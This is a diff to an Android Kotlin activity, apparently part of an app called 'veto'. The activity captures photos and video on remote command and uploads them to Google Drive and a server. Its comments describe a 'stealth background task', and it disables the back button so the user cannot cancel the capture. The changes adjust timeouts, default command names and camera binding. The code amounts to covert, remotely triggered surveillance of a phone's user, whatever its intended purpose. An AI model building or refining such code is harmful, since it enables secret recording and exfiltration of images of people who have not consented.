@@ -71,8 +71,6 @@ class DummyCameraxActivity : AppCompatActivity() {
         @Suppress("DEPRECATION")
         overridePendingTransition(0, 0)
 
-        moveTaskToBack(true)
-
         onBackPressedDispatcher.addCallback(this, object : androidx.activity.OnBackPressedCallback(true) {
             override fun handleOnBackPressed() {
                 // Do nothing to prevent user from cancelling the stealth background task
@@ -90,7 +88,7 @@ class DummyCameraxActivity : AppCompatActivity() {
         shouldFlash = intent.extras?.getBoolean(EXTRA_FLASH) ?: false
 
         lifecycleScope.launch {
-            val commandName = intent.getStringExtra(EXTRA_COMMAND) ?: "camera"
+            val commandName = intent.getStringExtra(EXTRA_COMMAND) ?: "photo"
             // Ensure any overall hardware lockup times out after a hard limit
             val result = withTimeoutOrNull(45000L) {
                 com.neubofy.veto.utils.CommandQueueManager.runMediaCommandInQueue {
@@ -126,7 +124,7 @@ class DummyCameraxActivity : AppCompatActivity() {
     }
 
     private suspend fun takePhoto() {
-        val commandName = intent.getStringExtra(EXTRA_COMMAND) ?: "camera"
+        val commandName = intent.getStringExtra(EXTRA_COMMAND) ?: "photo"
         val ctx = applicationContext
 
         val flashMode = if (shouldFlash && cameraExtra == CAMERA_BACK) {
@@ -174,8 +172,8 @@ class DummyCameraxActivity : AppCompatActivity() {
             return
         }
 
-        // Suspend with 3-second strict timeout for instant image capture callback
-        val imgBytes = withTimeoutOrNull(3000L) {
+        // Suspend with 5-second strict timeout for image capture callback
+        val imgBytes = withTimeoutOrNull(5000L) {
             suspendCancellableCoroutine<ByteArray?> { cont ->
                 imageCapture.takePicture(
                     cameraExecutor,
@@ -226,7 +224,7 @@ class DummyCameraxActivity : AppCompatActivity() {
             ctx.log().e(TAG, "Error writing photo file: ${e.message}")
         }
 
-        // Close activity IMMEDIATELY so camera hardware is freed in < 50ms
+        // Close activity IMMEDIATELY so camera hardware is freed
         finish()
 
         // Offload status notification and Google Drive upload to background scope
@@ -261,9 +259,7 @@ class DummyCameraxActivity : AppCompatActivity() {
 
         cameraProvider.unbindAll()
         try {
-            val preview = Preview.Builder().build()
-            cameraProvider.bindToLifecycle(this, cameraSelector, preview, videoCapture)
-            kotlinx.coroutines.delay(1000L)
+            cameraProvider.bindToLifecycle(this, cameraSelector, videoCapture)
         } catch (e: Exception) {
             this.log().e(TAG, "Cannot record video: bindToLifecycle failed. ${e.message}")
             val transport = NextJsServerTransport(ctx)
